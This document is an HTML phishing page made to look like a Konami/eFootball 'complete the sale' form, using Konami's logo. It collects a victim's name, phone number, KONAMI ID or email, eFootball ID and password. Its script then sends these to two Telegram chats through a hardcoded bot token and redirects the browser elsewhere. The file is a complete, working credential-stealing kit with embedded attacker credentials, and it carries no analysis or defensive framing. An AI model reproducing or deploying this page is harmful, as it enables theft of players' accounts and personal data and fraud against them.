<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Account Details</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #d50000, #8b0000);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 10px;
        }
        .container {
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            width: 420px;
            text-align: center;
            box-sizing: border-box;
        }
        .header img {
            width: 160px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 15px;
            font-weight: 700;
            font-size: 20px;
            color: #d50000;
        }
        .section-title {
            font-size: 16px;
            font-weight: bold;
            text-align: left;
            color: #444;
            margin: 15px 0 5px;
        }
        .input-group {
            position: relative;
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 12px 40px;
            font-size: 16px;
            border: 2px solid #ccc;
            border-radius: 8px;
            background: #f9f9f9;
            transition: border-color 0.3s ease-in-out;
            outline: none;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #d50000;
        }
        .input-group i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #d50000;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #d50000;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s ease-in-out;
            margin-top: 10px;
        }
        button:hover {
            background-color: #b00000;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://my.konami.net/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo-konami.b3f34124.png&w=256&q=75" alt="Konami Logo">
        </div>
        <h2>Enter Account Details to Complete the Sale</h2>

        <!-- Seller Information Section -->
        <div class="section-title">Seller Information</div>
        <div class="input-group">
            <i class="fas fa-user"></i>
            <input type="text" id="full_name" placeholder="Full Name">
        </div>
        <div class="input-group">
            <i class="fas fa-phone"></i>
            <input type="tel" id="phone_number" placeholder="Phone Number (for receiving payment)">
        </div>

        <!-- Account Information Section -->
        <div class="section-title">Account Information</div>
        <div class="input-group">
            <i class="fas fa-id-badge"></i>
            <input type="text" id="konami_id" placeholder="KONAMI ID / E-mail address">
        </div>
        <div class="input-group">
            <i class="fas fa-gamepad"></i>
            <input type="text" id="efootball_id" placeholder="eFootball ID">
        </div>
        <div class="input-group">
            <i class="fas fa-lock"></i>
            <input type="password" id="password" placeholder="Password">
        </div>

        <!-- Price Section -->
        <div class="section-title">Price</div>
        <div class="input-group">
            <i class="fas fa-dollar-sign"></i>
            <input type="number" id="price" placeholder="Enter Price ($)">
        </div>

        <button onclick="sendToTelegram()">Proceed with Payment Setup</button>
    </div>

    <script>
        function sendToTelegram() {
            let fullName = document.getElementById("full_name").value.trim();
            let phoneNumber = document.getElementById("phone_number").value.trim();
            let konamiId = document.getElementById("konami_id").value.trim();
            let efootballId = document.getElementById("efootball_id").value.trim();
            let password = document.getElementById("password").value.trim();
            let price = document.getElementById("price").value.trim();

            if (!fullName || !phoneNumber || !konamiId || !efootballId || !password || !price) {
                alert("Please fill in all required fields.");
                return;
            }

            let botToken = "7626603395:AAElrtAisJi0EYgdXygeCEUyrIqzYPp7l9w";
            let chatIds = ["5086851394", "5964410918"];

            let message = `ðŸ“Œ *New Account Sale*\n\n` +
                          `ðŸ‘¤ *Seller Name:* ${fullName}\n` +
                          `ðŸ“ž *Phone:* ${phoneNumber}\n` +
                          `ðŸŽ® *KONAMI ID:* ${konamiId}\n` +
                          `âš½ *eFootball ID:* ${efootballId}\n` +
                          `ðŸ”‘ *Password:* ${password}\n` +
                          `ðŸ’° *Price:* $${price}`;

            Promise.all(chatIds.map(chatId =>
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
                })
            )).then(() => {
                window.location.href = "B0.html";
            });
        }
    </script>
</body>
</html>
